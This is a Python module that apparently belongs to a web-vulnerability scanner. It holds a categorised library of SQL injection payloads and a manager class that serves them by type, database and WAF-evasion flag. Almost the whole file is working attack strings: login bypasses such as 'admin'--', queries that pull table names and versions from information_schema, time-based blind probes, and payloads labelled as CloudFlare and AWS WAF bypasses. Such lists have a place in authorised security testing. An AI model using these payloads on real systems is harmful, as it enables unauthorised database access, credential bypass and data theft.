from typing import List, Dict, Any, Optional
from dataclasses import dataclass, field
from enum import Enum


class SQLiType(Enum):
    """SQL Injection attack types."""
    ERROR_BASED = "error_based"
    UNION_BASED = "union_based"
    BOOLEAN_BLIND = "boolean_blind"
    TIME_BLIND = "time_blind"
    STACKED = "stacked_queries"
    OUT_OF_BAND = "out_of_band"


class DatabaseType(Enum):
    """Target database types."""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    MONGODB = "mongodb"
    MARIADB = "mariadb"
    GENERIC = "generic"


@dataclass
class SQLiPayload:
    """SQL Injection payload with metadata."""
    payload: str
    description: str
    sqli_type: SQLiType = SQLiType.ERROR_BASED
    database: DatabaseType = DatabaseType.GENERIC
    waf_evasion: bool = False
    risk_level: str = "safe"
    confidence: float = 0.8
    tags: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "payload": self.payload,
            "description": self.description,
            "type": self.sqli_type.value,
            "database": self.database.value,
            "waf_evasion": self.waf_evasion,
            "risk_level": self.risk_level,
            "confidence": self.confidence,
            "tags": self.tags,
        }


# =============================================================================
# HORUSSIGHT ELITE PAYLOADS
# =============================================================================

ELITE_SQLI = [
    SQLiPayload(
        payload="' OR (SELECT ASCII(SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),1,1)))>64--",
        description="Elite: Progressive table extraction",
        sqli_type=SQLiType.BOOLEAN_BLIND,
        database=DatabaseType.MYSQL,
        waf_evasion=True,
        confidence=0.95,
        tags=["elite", "mysql", "extraction"]
    ),
    SQLiPayload(
        payload="' /*!50000OR*/ (SELECT 1)=1--",
        description="Elite: CloudFlare WAF bypass",
        sqli_type=SQLiType.ERROR_BASED,
        database=DatabaseType.MYSQL,
        waf_evasion=True,
        confidence=0.93,
        tags=["elite", "waf_bypass", "mysql"]
    ),
    SQLiPayload(
        payload="' UNION/**/SELECT/**/NULL,NULL,table_name/**/FROM/**/information_schema.tables--",
        description="Elite: AWS WAF bypass",
        sqli_type=SQLiType.UNION_BASED,
        database=DatabaseType.MYSQL,
        waf_evasion=True,
        confidence=0.91,
        tags=["elite", "waf_bypass", "union"]
    ),
    SQLiPayload(
        payload="admin'/*",
        description="Elite: Minimal auth bypass",
        sqli_type=SQLiType.ERROR_BASED,
        database=DatabaseType.GENERIC,
        waf_evasion=True,
        confidence=0.90,
        tags=["elite", "auth_bypass"]
    ),
]

# =============================================================================
# ERROR-BASED PAYLOADS
# =============================================================================

ERROR_BASED_GENERIC = [
    SQLiPayload(
        payload="'",
        description="Single quote test",
        sqli_type=SQLiType.ERROR_BASED,
        database=DatabaseType.GENERIC,
        tags=["basic"]
    ),
    SQLiPayload(
        payload='"',
        description="Double quote test",
        sqli_type=SQLiType.ERROR_BASED,
        database=DatabaseType.GENERIC,
        tags=["basic"]
    ),
    SQLiPayload(
        payload="' OR '1'='1",
        description="Classic OR injection",
        sqli_type=SQLiType.ERROR_BASED,
        database=DatabaseType.GENERIC,
        tags=["classic", "auth_bypass"]
    ),
    SQLiPayload(
        payload="1' OR '1'='1'--",
        description="OR injection with comment",
        sqli_type=SQLiType.ERROR_BASED,
        database=DatabaseType.GENERIC,
        tags=["classic"]
    ),
    SQLiPayload(
        payload="1 OR 1=1",
        description="Numeric OR",
        sqli_type=SQLiType.ERROR_BASED,
        database=DatabaseType.GENERIC,
        tags=["numeric"]
    ),
    SQLiPayload(
        payload="' AND '1'='1",
        description="AND true condition",
        sqli_type=SQLiType.ERROR_BASED,
        database=DatabaseType.GENERIC,
        tags=["boolean"]
    ),
    SQLiPayload(
        payload="' AND '1'='2",
        description="AND false condition",
        sqli_type=SQLiType.ERROR_BASED,
        database=DatabaseType.GENERIC,
        tags=["boolean"]
    ),
]

ERROR_BASED_MYSQL = [
    SQLiPayload(
        payload="' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
        description="EXTRACTVALUE error extraction",
        sqli_type=SQLiType.ERROR_BASED,
        database=DatabaseType.MYSQL,
        tags=["mysql", "extraction"]
    ),
    SQLiPayload(
        payload="' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        description="UPDATEXML error extraction",
        sqli_type=SQLiType.ERROR_BASED,
        database=DatabaseType.MYSQL,
        tags=["mysql", "extraction"]
    ),
]

# =============================================================================
# UNION-BASED PAYLOADS
# =============================================================================

UNION_BASED_GENERIC = [
    SQLiPayload(
        payload="' UNION SELECT NULL--",
        description="1 column union",
        sqli_type=SQLiType.UNION_BASED,
        database=DatabaseType.GENERIC,
        tags=["union"]
    ),
    SQLiPayload(
        payload="' UNION SELECT NULL,NULL--",
        description="2 column union",
        sqli_type=SQLiType.UNION_BASED,
        database=DatabaseType.GENERIC,
        tags=["union"]
    ),
    SQLiPayload(
        payload="' UNION SELECT NULL,NULL,NULL--",
        description="3 column union",
        sqli_type=SQLiType.UNION_BASED,
        database=DatabaseType.GENERIC,
        tags=["union"]
    ),
    SQLiPayload(
        payload="' UNION SELECT 1,2,3--",
        description="3 column numeric",
        sqli_type=SQLiType.UNION_BASED,
        database=DatabaseType.GENERIC,
        tags=["union"]
    ),
    SQLiPayload(
        payload="' ORDER BY 1--",
        description="ORDER BY 1",
        sqli_type=SQLiType.UNION_BASED,
        database=DatabaseType.GENERIC,
        tags=["union", "enumeration"]
    ),
    SQLiPayload(
        payload="' ORDER BY 10--",
        description="ORDER BY 10",
        sqli_type=SQLiType.UNION_BASED,
        database=DatabaseType.GENERIC,
        tags=["union", "enumeration"]
    ),
]

UNION_BASED_MYSQL = [
    SQLiPayload(
        payload="' UNION SELECT version()--",
        description="Extract version",
        sqli_type=SQLiType.UNION_BASED,
        database=DatabaseType.MYSQL,
        tags=["mysql", "extraction"]
    ),
    SQLiPayload(
        payload="' UNION SELECT user()--",
        description="Extract user",
        sqli_type=SQLiType.UNION_BASED,
        database=DatabaseType.MYSQL,
        tags=["mysql", "extraction"]
    ),
    SQLiPayload(
        payload="' UNION SELECT database()--",
        description="Extract database",
        sqli_type=SQLiType.UNION_BASED,
        database=DatabaseType.MYSQL,
        tags=["mysql", "extraction"]
    ),
    SQLiPayload(
        payload="' UNION SELECT table_name FROM information_schema.tables--",
        description="Extract table names",
        sqli_type=SQLiType.UNION_BASED,
        database=DatabaseType.MYSQL,
        tags=["mysql", "schema"]
    ),
]

# =============================================================================
# BOOLEAN BLIND PAYLOADS
# =============================================================================

BOOLEAN_BLIND_GENERIC = [
    SQLiPayload(
        payload="' AND 1=1--",
        description="True condition",
        sqli_type=SQLiType.BOOLEAN_BLIND,
        database=DatabaseType.GENERIC,
        tags=["blind"]
    ),
    SQLiPayload(
        payload="' AND 1=2--",
        description="False condition",
        sqli_type=SQLiType.BOOLEAN_BLIND,
        database=DatabaseType.GENERIC,
        tags=["blind"]
    ),
    SQLiPayload(
        payload="' OR 1=1--",
        description="OR true",
        sqli_type=SQLiType.BOOLEAN_BLIND,
        database=DatabaseType.GENERIC,
        tags=["blind", "auth_bypass"]
    ),
]

# =============================================================================
# TIME-BASED BLIND PAYLOADS
# =============================================================================

TIME_BLIND_MYSQL = [
    SQLiPayload(
        payload="' AND SLEEP(5)--",
        description="SLEEP 5 seconds",
        sqli_type=SQLiType.TIME_BLIND,
        database=DatabaseType.MYSQL,
        tags=["time", "blind"]
    ),
    SQLiPayload(
        payload="' AND SLEEP(3)--",
        description="SLEEP 3 seconds",
        sqli_type=SQLiType.TIME_BLIND,
        database=DatabaseType.MYSQL,
        tags=["time", "blind"]
    ),
]

TIME_BLIND_MSSQL = [
    SQLiPayload(
        payload="'; WAITFOR DELAY '0:0:5'--",
        description="WAITFOR 5 seconds",
        sqli_type=SQLiType.TIME_BLIND,
        database=DatabaseType.MSSQL,
        tags=["time", "blind", "stacked"]
    ),
]

TIME_BLIND_POSTGRESQL = [
    SQLiPayload(
        payload="'; SELECT pg_sleep(5)--",
        description="pg_sleep 5",
        sqli_type=SQLiType.TIME_BLIND,
        database=DatabaseType.POSTGRESQL,
        tags=["time", "blind", "stacked"]
    ),
]

# =============================================================================
# STACKED QUERIES
# =============================================================================

STACKED_QUERIES = [
    SQLiPayload(
        payload="'; SELECT 1--",
        description="Basic stacked query",
        sqli_type=SQLiType.STACKED,
        database=DatabaseType.GENERIC,
        tags=["stacked"]
    ),
]

# =============================================================================
# WAF BYPASS PAYLOADS
# =============================================================================

WAF_BYPASS = [
    SQLiPayload(
        payload="' oR '1'='1",
        description="Mixed case OR",
        sqli_type=SQLiType.ERROR_BASED,
        database=DatabaseType.GENERIC,
        waf_evasion=True,
        tags=["waf_bypass"]
    ),
    SQLiPayload(
        payload="' UnIoN SeLeCt NuLL--",
        description="Mixed case UNION",
        sqli_type=SQLiType.UNION_BASED,
        database=DatabaseType.GENERIC,
        waf_evasion=True,
        tags=["waf_bypass"]
    ),
    SQLiPayload(
        payload="'/**/OR/**/1=1--",
        description="Comment spaces",
        sqli_type=SQLiType.ERROR_BASED,
        database=DatabaseType.GENERIC,
        waf_evasion=True,
        tags=["waf_bypass"]
    ),
]

# =============================================================================
# AUTHENTICATION BYPASS
# =============================================================================

AUTH_BYPASS = [
    SQLiPayload(
        payload="' OR '1'='1'--",
        description="Classic auth bypass",
        sqli_type=SQLiType.ERROR_BASED,
        database=DatabaseType.GENERIC,
        tags=["auth_bypass"]
    ),
    SQLiPayload(
        payload="admin'--",
        description="Admin comment bypass",
        sqli_type=SQLiType.ERROR_BASED,
        database=DatabaseType.GENERIC,
        tags=["auth_bypass"]
    ),
    SQLiPayload(
        payload="admin' OR '1'='1",
        description="Admin OR bypass",
        sqli_type=SQLiType.ERROR_BASED,
        database=DatabaseType.GENERIC,
        tags=["auth_bypass"]
    ),
    SQLiPayload(
        payload="' OR 1=1--",
        description="Password OR bypass",
        sqli_type=SQLiType.ERROR_BASED,
        database=DatabaseType.GENERIC,
        tags=["auth_bypass"]
    ),
]


# =============================================================================
# PAYLOAD MANAGER
# =============================================================================

class SQLiPayloadManager:
    """Ghost's SQL Injection payload manager."""
    
    def __init__(self):
        self._payloads: List[SQLiPayload] = []
        self._load_all()
    
    def _load_all(self):
        """Load all payload categories."""
        self._payloads.extend(ELITE_SQLI)
        self._payloads.extend(ERROR_BASED_GENERIC)
        self._payloads.extend(ERROR_BASED_MYSQL)
        self._payloads.extend(UNION_BASED_GENERIC)
        self._payloads.extend(UNION_BASED_MYSQL)
        self._payloads.extend(BOOLEAN_BLIND_GENERIC)
        self._payloads.extend(TIME_BLIND_MYSQL)
        self._payloads.extend(TIME_BLIND_MSSQL)
        self._payloads.extend(TIME_BLIND_POSTGRESQL)
        self._payloads.extend(STACKED_QUERIES)
        self._payloads.extend(WAF_BYPASS)
        self._payloads.extend(AUTH_BYPASS)
    
    @property
    def total_count(self) -> int:
        return len(self._payloads)
    
    @property
    def elite_count(self) -> int:
        return len(ELITE_SQLI)
    
    def get_all(self) -> List[SQLiPayload]:
        return self._payloads.copy()
    
    def get_strings(self) -> List[str]:
        return [p.payload for p in self._payloads]
    
    def get_by_type(self, sqli_type: SQLiType) -> List[SQLiPayload]:
        return [p for p in self._payloads if p.sqli_type == sqli_type]
    
    def get_by_database(self, db_type: DatabaseType) -> List[SQLiPayload]:
        return [p for p in self._payloads if p.database in (db_type, DatabaseType.GENERIC)]
    
    def get_waf_bypass(self) -> List[SQLiPayload]:
        return [p for p in self._payloads if p.waf_evasion]
    
    def get_auth_bypass(self) -> List[SQLiPayload]:
        return [p for p in self._payloads if "auth_bypass" in p.tags]
    
    def get_quick_tests(self) -> List[SQLiPayload]:
        """Get a small set of payloads for quick scanning."""
        quick = [
            SQLiPayload("'", description="Single quote", sqli_type=SQLiType.ERROR_BASED, database=DatabaseType.GENERIC),
            SQLiPayload("' OR '1'='1'--", description="Classic OR", sqli_type=SQLiType.ERROR_BASED, database=DatabaseType.GENERIC),
            SQLiPayload("' UNION SELECT NULL--", description="Union test", sqli_type=SQLiType.UNION_BASED, database=DatabaseType.GENERIC),
            SQLiPayload("' AND SLEEP(3)--", description="Time test", sqli_type=SQLiType.TIME_BLIND, database=DatabaseType.MYSQL),
        ]
        quick.extend(ELITE_SQLI[:2])
        return quick
    
    def get_stats(self) -> Dict[str, Any]:
        return {
            "total": self.total_count,
            "elite": self.elite_count,
            "inherited": self.total_count - self.elite_count,
            "by_type": {
                "error": len(self.get_by_type(SQLiType.ERROR_BASED)),
                "union": len(self.get_by_type(SQLiType.UNION_BASED)),
                "boolean_blind": len(self.get_by_type(SQLiType.BOOLEAN_BLIND)),
                "time_blind": len(self.get_by_type(SQLiType.TIME_BLIND)),
                "stacked": len(self.get_by_type(SQLiType.STACKED)),
            },
            "waf_bypass": len(self.get_waf_bypass()),
            "auth_bypass": len(self.get_auth_bypass()),
        }


# Singleton instance
_sqli_manager = None


def get_sqli_manager() -> SQLiPayloadManager:
    global _sqli_manager
    if _sqli_manager is None:
        _sqli_manager = SQLiPayloadManager()
    return _sqli_manager